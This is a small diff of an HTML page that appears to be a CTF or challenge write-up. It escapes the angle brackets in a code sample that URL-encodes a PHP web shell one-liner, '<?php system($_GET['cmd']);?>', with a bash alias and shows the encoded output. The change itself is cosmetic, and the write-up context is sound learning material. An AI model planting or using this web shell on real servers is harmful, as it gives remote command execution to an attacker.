@@ -1800,7 +1800,7 @@ elf.moveRight(11)
 <pre><code class="bash">alias urlencode
 urlencode=$'python3 -c "import sys, urllib.parse as ul; \\\n    print (ul.quote_plus(sys.argv[1]))"'
 
-urlencode '"<?php system($_GET['cmd']);?>"'                      
+urlencode '"&lt;?php system($_GET['cmd']);?&gt;"'                      
 %22%3C%3Fphp+system%28%24_GET%5Bcmd%5D%29%3B%3F%3E%22
 </code></pre>
 
